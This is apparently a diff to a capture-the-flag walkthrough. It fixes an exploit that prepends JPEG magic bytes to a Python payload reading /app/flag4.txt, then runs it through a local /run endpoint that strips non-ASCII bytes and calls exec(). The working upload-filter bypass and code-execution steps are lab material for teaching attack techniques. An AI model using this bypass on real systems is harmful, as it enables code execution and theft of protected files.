@@ -56,7 +56,8 @@ Flag: FLAG{upl04d_m4g1c_byt3s}
 
   python3 -c "
   with open('/tmp/exploit_magic.py', 'wb') as f:
-      f.write(b'\x89PNG')
+      # Use JPEG magic bytes (all non-printable, so regex strips them cleanly)
+      f.write(b'\xff\xd8\xff\xe0')
       f.write(b'\nprint(open(\"/app/flag4.txt\").read())\n')
   "
 
@@ -64,7 +65,10 @@ Flag: FLAG{upl04d_m4g1c_byt3s}
 
   curl "http://localhost:5010/run?file=exploit_magic.py&ch=4"
 
-  The /run endpoint strips leading non-ASCII bytes before exec().
+  NOTE: Don't use PNG magic (\x89PNG) — the letters P, N, G are printable
+  ASCII and survive the stripping regex, causing a NameError when Python
+  tries to execute "PNG" as code. JPEG magic (\xff\xd8\xff\xe0) is all
+  non-printable bytes, so the regex strips them cleanly.
 
 -------------------------------------------------------------------------------
 
